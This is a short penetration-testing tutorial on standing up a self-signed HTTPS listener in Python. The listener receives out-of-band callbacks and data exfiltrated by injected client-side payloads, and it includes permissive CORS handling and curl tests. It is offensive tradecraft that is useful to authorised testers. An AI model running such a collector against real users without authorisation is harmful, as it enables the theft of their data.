Modern browsers enforce mixed-content restrictions: a page loaded over HTTPS will silently block requests to plain HTTP endpoints. This becomes a real problem during exploitation of client-side vulnerabilities (XXE, XSLT SSRF, stored XSS, blind injections, etc.) when the target application itself is served over HTTPS — a payload pointing at `http://<attacker-ip>:8000` will simply be blocked by the browser before it ever leaves the page. The fix is to stand up your own listener that also speaks TLS, so out-of-band callbacks and data exfiltration aren't dropped by the browser's own security policy.


---

## Generating a Self-Signed Certificate

Before writing the server, generate a certificate/key pair. Since this is only used to satisfy the browser's HTTPS requirement (not for real trust validation), a self-signed cert is enough — arbitrary values can be used for the certificate subject fields.

```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

This produces a single `server.pem` file containing both the private key and the certificate, which simplifies loading it later.


---

## Building the Server

A minimal Python HTTPS server based on `http.server` is enough to capture exfiltrated data. Two things need to be handled explicitly: CORS preflight (`OPTIONS`) requests, since browsers send these before cross-origin `POST` calls from injected JavaScript, and logging of both GET parameters and POST bodies so nothing gets missed.

```python
from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.end_headers()

print("Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...")
httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

The `Access-Control-Allow-Origin: *` header is what allows a JavaScript payload running on the victim's origin to successfully complete a cross-origin `fetch`/`XMLHttpRequest` POST to this server instead of being blocked by CORS.

---
## Running and Testing

Start the server:

```bash
python3 server.py
```

Then validate it from a second terminal using `curl`. The `-k` flag is required since the certificate is self-signed and would otherwise fail validation:

```bash
curl -vk https://127.0.0.1:4443/get?Hello=World
curl -vk https://127.0.0.1:4443/post?Hello=World -d 'test=123'
```

Both the request path (with GET parameters) and the POST body get printed to the server's stdout, which is enough to confirm exfiltrated data is being captured:

```
Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
127.0.0.1 - - [30/Nov/2025 11:18:12] code 404, message File not found
127.0.0.1 - - [30/Nov/2025 11:18:12] "GET /get?Hello=World HTTP/1.1" 404 -
127.0.0.1 - - [30/Nov/2025 11:18:29] [i] POST body: test=123
127.0.0.1 - - [30/Nov/2025 11:18:29] "POST /post?Hello=World HTTP/1.1" 200 -
```

The `404` on the GET request is expected — `SimpleHTTPRequestHandler` tries to serve a static file matching the path, which doesn't exist. This doesn't matter for exfiltration purposes, since the parameters were already logged before the 404 was returned.

